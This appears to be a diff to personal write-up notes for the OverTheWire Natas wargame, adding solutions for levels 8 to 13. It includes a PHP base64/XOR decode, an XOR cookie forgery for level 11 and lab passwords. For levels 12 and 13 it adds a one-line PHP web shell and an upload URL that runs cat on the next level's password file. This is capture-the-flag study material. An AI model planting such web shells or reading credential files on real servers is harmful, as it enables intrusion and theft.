@@ -38,6 +38,10 @@
   * view the link given source code.
   * encodedSecret = "3d3d516343746d4d6d6c315669563362";
   * DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+  * ```PHP CODE:<?
+  * ```print base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
+  * ```?> 
+  * ```OUTPUT: oubWYf2kBq
 
 * level 9
   * Access granted.The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
@@ -49,13 +53,41 @@
 
 * level 11
   * The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+  * ```<?
+  * ```$key = base64_decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sF0cIaAw');
+  * ```$text = json_encode(array("showpassword"=>"no", "bgcolor"=>"#ffffff"));
+  * ```$outText = ''; 
+  * ```// Iterate through each character
+  * ```for($i=0;$i<strlen($text);$i++) {
+  * ```$outText .= $text[$i] ^ $key[$i % strlen($key)];}
+  * ```print $outText;
+  * ```?>
+  * Output:  qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq!nJq
+  * ```<?
+  * ```$key = 'qw8J';
+  * ```$text = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+  * ```$outText = '';
+  * ```// Iterate through each character
+  * ```for($i=0;$i<strlen($text);$i++) {
+  * ```$outText .= $text[$i] ^ $key[$i % strlen($key)];}
+  * ```print base64_encode($outText);
+  * ```?>
+  * Output:  ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
 
 * level 12
+  * create an xyz.php file with contents as:
+  * ```<?
+  * ```passthru($_GET['cmd']);
+  * ```?>
   * Uploaded this file, checked the vulnerabilities using burpsuit, set the file as .php
   * gave request as ---->  http://natas12.natas.labs.overthewire.org/upload/gcblmhl9mz.php?cmd=cat%20/etc/natas_webpass/natas13
   * jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY 
 
 * level 13
+  * create an ab.php file with contents as:
+  * ```<?
+  * ```passthru($_GET['cmd']);
+  * ```?>
   * Using hex editor did mention spaces FF D8 FF E0
   * Uploaded this file, checked the vulnerabilities using burpsuit, set the file as .php
   * gave request as ---->  http://natas12.natas.labs.overthewire.org/upload/gcblmhl9mz.php?cmd=cat%20/etc/natas_webpass/natas14
@@ -67,6 +99,5 @@
   * Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 * level 15
-  * 
 
 * level 16
